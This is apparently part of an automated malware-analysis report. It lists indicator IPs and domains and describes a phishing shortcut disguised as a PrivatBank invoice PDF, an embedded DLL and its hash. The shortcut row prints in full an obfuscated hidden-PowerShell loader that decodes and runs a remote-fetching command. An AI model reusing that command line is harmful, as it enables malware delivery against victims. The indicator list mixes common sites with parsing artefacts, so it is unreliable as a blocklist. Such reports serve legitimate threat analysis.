| **IPv4** | `192[.]42[.]116[.]17` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `64[.]124[.]77[.]157` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `205[.]169[.]39[.]25` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `192[.]42[.]116[.]103` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `10[.]11[.]225[.]117` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `152[.]32[.]240[.]77` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `51[.]89[.]103[.]123` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `72[.]152[.]84[.]250` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `139[.]180[.]185[.]87` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `149[.]88[.]102[.]45` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `92[.]213[.]21[.]249` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `94[.]207[.]206[.]127` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `72[.]135[.]49[.]119` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `132[.]243[.]23[.]233` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `51[.]75[.]127[.]137` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `77[.]89[.]8[.]250` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `45[.]84[.]107[.]17` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `192[.]42[.]116[.]57` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `196[.]245[.]151[.]212` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `146[.]70[.]29[.]201` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `37[.]46[.]115[.]7` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `51[.]75[.]159[.]29` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `35[.]161[.]55[.]221` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `141[.]98[.]103[.]251` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `141[.]227[.]137[.]47` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `209[.]50[.]227[.]112` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `149[.]22[.]85[.]73` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `46[.]199[.]75[.]109` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `45[.]9[.]250[.]4` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `129[.]227[.]97[.]123` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `156[.]244[.]32[.]75` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `84[.]20[.]16[.]101` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `220[.]130[.]62[.]51` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `116[.]206[.]228[.]184` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `211[.]25[.]3[.]117` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `84[.]233[.]234[.]82` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `128[.]90[.]173[.]60` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `38[.]54[.]124[.]8` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `63[.]177[.]146[.]192` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `18[.]177[.]231[.]131` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `185[.]14[.]47[.]133` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `35[.]202[.]239[.]62` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `37[.]120[.]206[.]51` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `87[.]101[.]92[.]27` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `34[.]69[.]198[.]60` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `170[.]62[.]100[.]87` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `3[.]16[.]45[.]71` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `3[.]144[.]47[.]201` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `3[.]147[.]56[.]70` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `52[.]14[.]128[.]194` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `3[.]16[.]109[.]96` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `3[.]145[.]99[.]203` | Observed in acquired/decoded evidence | Medium (context required) |
| **IPv4** | `18[.]220[.]46[.]49` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `startpage.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `botscout.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.roblox.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `1fichier.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `simpleapi.majestic.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `2Fwww.google.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.google.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `google.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.axs.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `m.facebook.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `gs.yandex.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `ipcheck1.jdownloader.org` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.stopforumspam.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `httpheader.net` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `api.ipify.org` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `telegram.org` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `html.duckduckgo.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `pascal.hoez.free.fr` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `text.ru` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.ticketmaster.co.uk` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.yellowpages.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.zapmeta.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `ipinfo.io` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `azenv.net` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `newassets.hcaptcha.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.mojeek.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.sbjudge2.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.bing.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.wfuchs.de` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www2.proxyswitcher.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.instagram.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `wtfismyip.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `lumtest.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.soundcloud.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `translate.google.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `checktrust.ru` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `x.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.knowops.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `eu.supreme.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `berlin.craigslist.org` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `us.search.yahoo.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `ip-api.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.ebay.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.yelp.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.amazon.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.etsy.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `luisaranguren.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.yell.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.izito.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `moz.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `check2.zennolab.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.kleinanzeigen.de` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `search.brave.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `jagerman.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `check.getipintel.net` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `40hotmail.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `www.reddit.com` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `env.dev` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `System.Net` | Observed in acquired/decoded evidence | Medium (context required) |
| **Domain** | `github.com` | Observed in acquired/decoded evidence | Medium (context required) |

### Windows LNK Findings

| File | Relative Path | Working Directory | Arguments / Command Hints |
|---|---|---|---|
| `Payment invoice INV-15468869 13.08.2026 PrivatBank.pdf.lnk` | `..\..\..\..\..\..\Windows\System32\cmd.exe` | `C:\Windows\System32` | /c start /b powershell -NoP -EP Bypass -W Hidden -C " $s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NykyLjt6Mi4uKmB1dWNpdGtvaHRoaGl0aWNgYmpiY3UtMzR0Mi47ZTM+Z2s=').ForEach{${_}-bxor 90}); $s=$s.Trim(); &([scriptblock]::Create($s)) " |

### PE Candidates

| Candidate | Source | Architecture | Entry Point | Suspicious Sections | SHA-256 |
|---|---|---|---|---|---|
| `embedded_pe_4e0548ca.dll` | pisos.bin | x64 / 64-bit | `0x95a0` | None flagged | `4e0548ca06cd72221c455c67f1c1ad82d6f26d04da38a22a0b9a4a3b20442ae1` |

### Deep Technical Threat Analysis

_Automated deep technical assessment unavailable._